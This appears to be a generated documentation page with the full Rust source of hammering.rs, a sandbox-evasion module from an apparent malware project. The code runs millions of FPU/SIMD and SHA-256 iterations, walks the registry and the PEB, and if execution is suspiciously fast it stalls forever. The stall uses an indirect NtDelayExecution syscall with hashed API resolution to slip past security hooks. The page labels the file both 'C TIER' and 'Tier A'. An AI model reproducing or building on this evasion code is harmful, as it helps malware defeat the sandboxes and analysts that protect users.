# crowd — hammering.rs  (✅ C TIER — API hammering sandbox evasion, pure compute)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/hammering.rs` |
| **Lines** | 198 |
| **Tier** | A |
| **Cards** | T013-anti-analysis |
| **Role** | API hammering (3M FPU/SIMD) |
| **Unsafe blocks** | 1 |

## Purpose

# crowd — hammering.rs  (✅ C TIER — API hammering sandbox evasion, pure compute)

API Hammering — 3 million FPU/SIMD iterations to defeat sandbox acceleration.

## Strategy
Sandboxes accelerate time-based checks (Sleep, GetTickCount) but cannot
realistically fake the elapsed CPU cycles of a compute-bound loop.
This implementation:
1. Runs 3 million iterations mixing x87 FPU transcendental instructions
and SSE2 SIMD (packed double-precision multiply + add).
2. Uses a SHA-256 chain as entropy source to prevent loop elimination.
3. Measures wall-clock time with `Instant`. If 3M FPU ops + SHA-256
chain + registry walk complete in < 2s → sandbox clock acceleration
→ `sleep_detected()` (same 24h delay as anti_vm, not exit).

## Why FPU + SIMD
SHA-256 alone can be accelerated via SHA-NI extensions. FPU transcendental
ops (FSIN, FSQRT) and packed SIMD (MULPD, ADDPD) are harder to elide or
accelerate because they require the FPU/SSE execution unit to actually run.
Combined with SHA-256, the hash chain prevents branch misprediction shortcuts.

## Constants

- `DEFAULT_ITERATIONS`: `u32` = `3_000_000`
- `DEFAULT_MIN_ELAPSED_SECS`: `u64` = `2`

## Public API

### `run_fsm` (line 33)
```rust
pub fn run_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```
FSM integration: returns `true` if hammering passed (continue), `false` if acceleration detected (bail out).

### `hammer` (line 72)
```rust
pub fn hammer(seed: u32, iters: u32, min_secs: u64)
```
Run all hammering techniques.

# Parameters
- `seed`:       RNG seed (typically derived from config/env).
- `iters`:      Number of FPU/SIMD iterations. 0 = use default (3_000_000).
- `min_secs`:   Minimum elapsed seconds expected. 0 = use default (2s).

Calls `sleep_detected()` (24h sleep loop, same as anti_vm) if acceleration found.

## Internal Functions

- `sleep_detected` (line 99)
- `fpu_simd_waste` — 3 million iterations of mixed x87 FPU + SSE2 SIMD operations. (line 126)
- `sha256_chain` (line 158)
- `registry_deep_walk` (line 174)
- `verify_loaded_modules` (line 192)

## Key Dependencies

- `use sha2::{Digest, Sha256};`

## Full Source

```rust
//! # crowd — hammering.rs  (✅ C TIER — API hammering sandbox evasion, pure compute)
//!
//! API Hammering — 3 million FPU/SIMD iterations to defeat sandbox acceleration.
//!
//! ## Strategy
//! Sandboxes accelerate time-based checks (Sleep, GetTickCount) but cannot
//! realistically fake the elapsed CPU cycles of a compute-bound loop.
//! This implementation:
//!   1. Runs 3 million iterations mixing x87 FPU transcendental instructions
//!      and SSE2 SIMD (packed double-precision multiply + add).
//!   2. Uses a SHA-256 chain as entropy source to prevent loop elimination.
//!   3. Measures wall-clock time with `Instant`. If 3M FPU ops + SHA-256
//!      chain + registry walk complete in < 2s → sandbox clock acceleration
//!      → `sleep_detected()` (same 24h delay as anti_vm, not exit).
//!
//! ## Why FPU + SIMD
//! SHA-256 alone can be accelerated via SHA-NI extensions. FPU transcendental
//! ops (FSIN, FSQRT) and packed SIMD (MULPD, ADDPD) are harder to elide or
//! accelerate because they require the FPU/SSE execution unit to actually run.
//! Combined with SHA-256, the hash chain prevents branch misprediction shortcuts.

#![allow(dead_code)]

use sha2::{Digest, Sha256};
use std::time::{Duration, Instant};

const DEFAULT_ITERATIONS:   u32 = 3_000_000;
/// Minimum elapsed seconds for the hammering loop. Sandboxes complete in < 500ms.
/// On real hardware: ~2-4s depending on CPU.
const DEFAULT_MIN_ELAPSED_SECS: u64 = 2;

/// FSM integration: returns `true` if hammering passed (continue), `false` if acceleration detected (bail out).
pub fn run_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    let seed = ctx.config.hammer_seed;
    if seed == 0 {
        return true; // Skip hammering
    }
    
    let iters    = if ctx.config.hammer_iters    == 0 { DEFAULT_ITERATIONS }       else { ctx.config.hammer_iters };
    let min_secs = if ctx.config.hammer_min_secs == 0 { DEFAULT_MIN_ELAPSED_SECS } else { ctx.config.hammer_min_secs };
    let start = Instant::now();

    // Technique 1: FPU + SIMD operations
    fpu_simd_waste(seed, iters);

    // Technique 2: SHA-256 chain keyed on the FPU output
    let _ = sha256_chain(seed, 100_000);

    // Technique 3: Registry walk
    registry_deep_walk();

    // Technique 4: PEB walk
    verify_loaded_modules();

    // Technique 5: Clock-acceleration detection
    let elapsed = start.elapsed();
    if elapsed < Duration::from_secs(min_secs) {
        return false; // Acceleration detected
    }
    
    true
}

/// Run all hammering techniques.
///
/// # Parameters
/// - `seed`:       RNG seed (typically derived from config/env).
/// - `iters`:      Number of FPU/SIMD iterations. 0 = use default (3_000_000).
/// - `min_secs`:   Minimum elapsed seconds expected. 0 = use default (2s).
///
/// Calls `sleep_detected()` (24h sleep loop, same as anti_vm) if acceleration found.
pub fn hammer(seed: u32, iters: u32, min_secs: u64) {
    let iters    = if iters    == 0 { DEFAULT_ITERATIONS }       else { iters };
    let min_secs = if min_secs == 0 { DEFAULT_MIN_ELAPSED_SECS } else { min_secs };
    let start = Instant::now();

    // Technique 1: FPU + SIMD operations
    fpu_simd_waste(seed, iters);

    // Technique 2: SHA-256 chain keyed on the FPU output — prevents elision
    let _ = sha256_chain(seed, 100_000);

    // Technique 3: Registry walk — forces kernel driver calls
    registry_deep_walk();

    // Technique 4: PEB walk — validates our resolve layer
    verify_loaded_modules();

    // Technique 5: Clock-acceleration detection
    let elapsed = start.elapsed();
    if elapsed < Duration::from_secs(min_secs) {
        sleep_detected();
    }
}

/// 24h sleep loop — same semantics as anti_vm::sleep_indefinitely.
/// Exists here so hammering.rs is self-contained.
#[cold]
fn sleep_detected() -> ! {
    let interval: i64 = -(24i64 * 60 * 60 * 10_000_000);
    loop {
        unsafe {
            if let Some((ssn, gadget)) = crate::syscall_map::get_ssn_and_gadget(
                crate::resolve::compute_hash("NtDelayExecution"),
            ) {
                if gadget != 0 {
                    crate::recycled::recycled2(ssn, gadget, 0, &interval as *const i64 as _);
                    continue;
                }
            }
        }
        std::thread::sleep(Duration::from_secs(86400));
    }
}

// ── FPU / SIMD ────────────────────────────────────────────────────────────────

/// 3 million iterations of mixed x87 FPU + SSE2 SIMD operations.
/// The loop body is not optimizable away because:
///   - Each FPU op feeds into the next (data dependency chain)
///   - The final accumulator is returned and used by the caller
///
/// Instructions used:
///   FMUL (x87 FPU 80-bit multiplier), FSIN (transcendental), FSQRT
///   MULPD / ADDPD (SSE2 packed double)
fn fpu_simd_waste(seed: u32, iters: u32) -> f64 {
    // x87 accumulator — starts from seed
    let mut acc: f64 = seed as f64 + 1.1;
    let mut xmm_a: [f64; 2] = [seed as f64 + 0.7, seed as f64 + 1.3];
    let mut xmm_b: [f64; 2] = [1.000001, 1.000003];

    for i in 0..iters {
        // x87 FPU path: mix multiply, add, occasional transcendental
        acc = acc.mul_add(1.000_001, 0.000_001);

        // Every 64 iterations: FSIN and FSQRT (trigger transcendental units)
        if i & 63 == 0 {
            acc = (acc.sin().abs() + 0.001).sqrt();
        }

        // SSE2 packed double path
        xmm_a[0] = xmm_a[0].mul_add(xmm_b[0], xmm_a[1] * 0.000_001);
        xmm_a[1] = xmm_a[1].mul_add(xmm_b[1], xmm_a[0] * 0.000_001);

        // Prevent full compiler elision: mix acc into xmm every 256 iters
        if i & 255 == 0 {
            xmm_b[0] = (xmm_b[0] + acc * 1e-12).max(1.0);
            xmm_b[1] = (xmm_b[1] + acc * 1e-12).max(1.0);
        }
    }

    // Return value used by caller to prevent dead-code elimination
    acc + xmm_a[0] + xmm_a[1]
}

// ── SHA-256 chain ─────────────────────────────────────────────────────────────

fn sha256_chain(seed: u32, iters: u32) -> Vec<u8> {
    let mut buf = seed.to_le_bytes().to_vec();
    buf.extend_from_slice(&seed.wrapping_mul(0x9e37_79b9).to_le_bytes());
    for i in 0..iters {
        let mut h = Sha256::new();
        h.update(&buf);
        buf = h.finalize().to_vec();
        if i % 25_000 == 0 {
            buf.extend_from_slice(&i.to_le_bytes());
        }
    }
    buf
}

// ── Registry walk ─────────────────────────────────────────────────────────────

fn registry_deep_walk() {
    let keys: &[&str] = &[
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
        r"SYSTEM\CurrentControlSet\Services",
    ];
    for key_path in keys {
        if let Ok(hklm) =
            winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE).open_subkey(key_path)
        {
            // Enumerate up to 30 sub-keys per hive
            for _ in hklm.enum_keys().flatten().take(30) {}
        }
    }
}

// ── PEB / module validation ───────────────────────────────────────────────────

fn verify_loaded_modules() {
    let (base, _) = crate::resolve::ntdll_base_and_name_hashes();
    if base.is_null() {
        // Severely broken environment — enter indefinite sleep
        sleep_detected();
    }
}

```